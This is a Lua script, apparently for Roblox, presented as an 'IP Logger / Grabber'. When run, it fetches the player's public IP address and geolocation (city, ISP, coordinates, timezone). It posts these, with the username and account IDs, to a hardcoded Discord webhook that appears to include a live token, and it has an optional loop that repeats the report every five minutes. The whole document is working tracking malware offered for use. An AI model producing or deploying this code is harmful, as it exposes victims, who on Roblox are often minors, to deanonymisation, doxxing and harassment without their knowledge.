-- Roblox IP Logger / Grabber - Sends to Discord webhook
-- Load with: loadstring(game:HttpGet("your_link_here"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- CHANGE THIS TO YOUR DISCORD WEBHOOK
local WEBHOOK = "https://discordapp.com/api/webhooks/1475444904833581059/sV0NQIWLtHAlTV96nyiPYrdnyyXQ40HK-0SOnhPZih_wwZ3uxs-8ZgqoBew4cjJki11l"

local function sendToWebhook(title, description, color)
    local data = {
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description,
            ["color"] = color or 0x00ff00,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["footer"] = {["text"] = "Lua IP Grabber • " .. os.date("%H:%M:%S")}
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

local function getIPInfo()
    local success, ip = pcall(function()
        return HttpService:GetAsync("https://api.ipify.org")
    end)
    
    if not success then
        return {error = "Failed to get IP"}
    end
    
    local geoSuccess, geoData = pcall(function()
        return HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/" .. ip))
    end)
    
    if geoSuccess and geoData.status == "success" then
        return geoData
    else
        return {ip = ip, error = "Geo lookup failed"}
    end
end

-- Main execution
local function main()
    local player = LocalPlayer
    local info = getIPInfo()
    
    local msg = string.format(
        "**IP Grabbed from Roblox**\n\n" ..
        "Username: **%s** (@%s)\n" ..
        "UserId: **%d**\n" ..
        "PlaceId: **%d**\n" ..
        "JobId: **%s**\n\n" ..
        "**IP Details**\n" ..
        "IP: `%s`\n" ..
        "City/Region: `%s`, `%s`\n" ..
        "Country: `%s`\n" ..
        "ISP: `%s`\n" ..
        "Org: `%s`\n" ..
        "Lat/Lon: `%s`, `%s`\n" ..
        "Timezone: `%s`",
        
        player.Name,
        player.DisplayName,
        player.UserId,
        game.PlaceId,
        game.JobId,
        info.ip or "N/A",
        info.city or "N/A",
        info.regionName or "N/A",
        info.country or "N/A",
        info.isp or "N/A",
        info.org or "N/A",
        info.lat or "N/A",
        info.lon or "N/A",
        info.timezone or "N/A"
    )
    
    sendToWebhook("Roblox IP Grab", msg, 0xff0000)
end

-- Run immediately
main()

-- Optional: Keep alive / heartbeat (uncomment if you want periodic updates)
--[[
while true do
    wait(300) -- every 5 minutes
    main()
end
--]]